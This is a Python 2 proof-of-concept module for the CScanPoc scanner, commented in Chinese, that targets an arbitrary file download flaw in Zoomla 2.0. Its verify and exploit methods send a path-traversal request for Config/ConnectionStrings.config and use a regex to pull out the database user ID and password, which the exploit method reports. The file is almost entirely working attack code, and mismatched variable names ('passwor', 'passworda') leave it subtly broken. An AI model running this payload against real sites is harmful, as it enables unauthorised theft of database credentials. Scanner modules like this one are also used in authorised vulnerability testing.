# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re


class Vuln(ABVuln):
    vuln_id = 'Zoomla_0002'  # 平台漏洞编号，留空
    name = 'Zoomla 2.0 /User/UserZone/School/Download.aspx 任意文件下载漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-10-17'  # 漏洞公布时间
    desc = '''
        Zoomla X2.0 /User/UserZone/School/Download.aspx文件存在任意文件下载漏洞
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zoomla'  # 漏洞应用名称
    product_version = '2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '94b4b8dd-4198-4dd0-a0c0-f4f05ac42a1f'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            username = ""
            passwor = ""
            payload = "/User/UserZone/School/Download.aspx?f=..\..\..\Config\ConnectionStrings.config"
            verify_url = '{target}'.format(target=self.target)+payload
            response = urllib2.urlopen(verify_url)
            html = response.read().decode('utf-8')
            data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
            username = data[0][0]
            password = data[0][1]

            if username and password:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            username = ""
            passwor = ""
            payload = "/User/UserZone/School/Download.aspx?f=..\..\..\Config\ConnectionStrings.config"
            verify_url = '{target}'.format(target=self.target)+payload
            response = urllib2.urlopen(verify_url)
            html = response.read().decode('utf-8')
            data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
            username = data[0][0]
            password = data[0][1]

            if username and password:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=passworda))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
